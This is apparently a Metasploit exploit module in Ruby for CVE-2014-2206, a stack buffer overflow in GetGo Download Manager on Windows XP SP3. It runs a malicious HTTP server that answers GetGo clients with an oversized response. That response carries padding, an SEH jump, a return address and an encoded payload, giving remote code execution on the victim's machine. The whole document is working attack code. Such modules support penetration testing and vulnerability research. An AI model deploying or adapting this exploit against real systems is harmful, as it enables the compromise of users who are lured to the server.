# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking

include Msf::Exploit::Remote::Seh
include Msf::Exploit::Remote::HttpServer

def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;GetGo Download Manager HTTP Response Buffer Overflow&#039;,
&#039;Description&#039; => %q{
This module exploits a stack-based buffer overflow vulnerability in
GetGo Download Manager version 4.9.0.1982 and earlier, caused by an
overly long HTTP response header.
By persuading the victim to download a file from a malicious server, a
remote attacker could execute arbitrary code on the system or cause
the application to crash. This module has been tested successfully on
Windows XP SP3.
},
&#039;License&#039; => MSF_LICENSE,
&#039;Author&#039; =>
[
&#039;Julien Ahrens&#039;, # Vulnerability discovery
&#039;Gabor Seljan&#039; # Metasploit module
],
&#039;References&#039; =>
[
[ &#039;EDB&#039;, &#039;32132&#039; ],
[ &#039;OSVDB&#039;, &#039;103910&#039; ],
[ &#039;CVE&#039;, &#039;2014-2206&#039; ],
],
&#039;DefaultOptions&#039; =>
{
&#039;ExitFunction&#039; => &#039;process&#039;,
&#039;URIPATH&#039; => "/shakeitoff.mp3"
},
&#039;Platform&#039; => &#039;win&#039;,
&#039;Payload&#039; =>
{
&#039;BadChars&#039; => "\x00\x0a\x0d",
&#039;Space&#039; => 2000
},
&#039;Targets&#039; =>
[
[ &#039;Windows XP SP3&#039;,
{
&#039;Offset&#039; => 4107,
&#039;Ret&#039; => 0x00280b0b # CALL DWORD PTR SS:[EBP+30]
}
]
],
&#039;Privileged&#039; => false,
&#039;DisclosureDate&#039; => &#039;Mar 09 2014&#039;,
&#039;DefaultTarget&#039; => 0))
end

#
# Handle the HTTP request and return a response.
# Code borrowed from: msf/core/exploit/http/server.rb
#
def start_http(opts={})
use_zlib

comm = datastore[&#039;ListenerComm&#039;]
if (comm.to_s == "local")
comm = ::Rex::Socket::Comm::Local
else
comm = nil
end

# Default the server host / port
opts = {
&#039;ServerHost&#039; => datastore[&#039;SRVHOST&#039;],
&#039;ServerPort&#039; => datastore[&#039;HTTPPORT&#039;],
&#039;Comm&#039; => comm
}.update(opts)

# Start a new HTTP server
@http_service = Rex::ServiceManager.start(
Rex::Proto::Http::Server,
opts[&#039;ServerPort&#039;].to_i,
opts[&#039;ServerHost&#039;],
datastore[&#039;SSL&#039;],
{
&#039;Msf&#039; => framework,
&#039;MsfExploit&#039; => self
},
opts[&#039;Comm&#039;],
datastore[&#039;SSLCert&#039;]
)

@http_service.server_name = datastore[&#039;HTTP::server_name&#039;]

# Default the procedure of the URI to on_request_uri if one isn&#039;t
# provided.
uopts = {
&#039;Proc&#039; => Proc.new { |cli, req|
on_request_uri(cli, req)
},
&#039;Path&#039; => resource_uri
}.update(opts[&#039;Uri&#039;] || {})

proto = (datastore["SSL"] ? "https" : "http")
print_status("Using URL: #{proto}://#{opts[&#039;ServerHost&#039;]}:#{opts[&#039;ServerPort&#039;]}#{uopts[&#039;Path&#039;]}")

if (opts[&#039;ServerHost&#039;] == &#039;0.0.0.0&#039;)
print_status(" Local IP:
#{proto}://#{Rex::Socket.source_address(&#039;1.2.3.4&#039;)}:#{opts[&#039;ServerPort&#039;]}#{uopts[&#039;Path&#039;]}")
end

# Add path to resource
@service_path = uopts[&#039;Path&#039;]
@http_service.add_resource(uopts[&#039;Path&#039;], uopts)

# As long as we have the http_service object, we will keep the server alive
while @http_service
select(nil, nil, nil, 1)
end
end


#
# Kill HTTP/FTP (shut them down and clear resources)
#
def cleanup
super
stop_service

begin
@http_service.remove_resource(datastore[&#039;URIPATH&#039;])
@http_service.deref
@http_service.stop
@http_service.close
@http_service = nil
rescue
end
end


def on_request_uri(cli, request)

print_status("Client connected...")

unless request[&#039;User-Agent&#039;] =~ /GetGo Download Manager 4.0/
print_error("Sending 404 for unknown user-agent")
send_not_found(cli)
return
end

sploit = rand_text_alpha(target[&#039;Offset&#039;])
sploit << "\x90\x90\xEB\x06"
sploit << [target.ret].pack(&#039;V&#039;)
sploit << payload.encoded

print_status("Sending #{sploit.length} bytes to port #{cli.peerport}...")

resp = create_response(200, sploit)
resp.body = ""
cli.send_response(resp)

close_client(cli)

end
end

